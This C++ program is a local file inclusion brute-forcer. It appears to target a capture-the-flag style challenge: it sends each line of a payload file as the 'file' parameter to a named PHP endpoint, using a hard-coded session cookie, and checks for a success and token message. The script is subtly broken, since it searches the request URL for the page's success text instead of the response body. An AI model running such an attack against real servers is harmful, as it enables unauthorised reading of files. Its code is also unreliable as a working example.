#include <iostream>
#include <fstream>
#include <string>
#include <curl/curl.h>

int main() {
    std::ifstream file("LFIPayloads.txt");
    std::string line;

    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        std::string url = "http://572g.1.time4vps.cloud/1f1.php";
        std::string cookies = "PHPSESSID=sp8scl1fnsuhakalfnjjaumn9b";

        while(std::getline(file, line)) {
            std::string params = "level=3&file=" + line;
            std::string request_url = url + "?" + params;

            curl_easy_setopt(curl, CURLOPT_URL, request_url.c_str());
            curl_easy_setopt(curl, CURLOPT_COOKIE, cookies.c_str());

            res = curl_easy_perform(curl);
            if(res != CURLE_OK) {
                std::cerr << "cURL error: " << curl_easy_strerror(res) << std::endl;
            } else {
                char *response;
                curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, &response);
                std::cout << "Response: " << response << std::endl;

                // Check for success message and token message
                std::string success_message = "Correct, you solved it!";
                std::string token_message = "Your token is valid for 10 minutes from now:";
                if(std::string(response).find(success_message) != std::string::npos &&
                   std::string(response).find(token_message) != std::string::npos) {
                    std::cout << "Success Message:" << std::endl;
                    std::cout << response << std::endl;
                    break;
                }
            }
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
    return 0;
}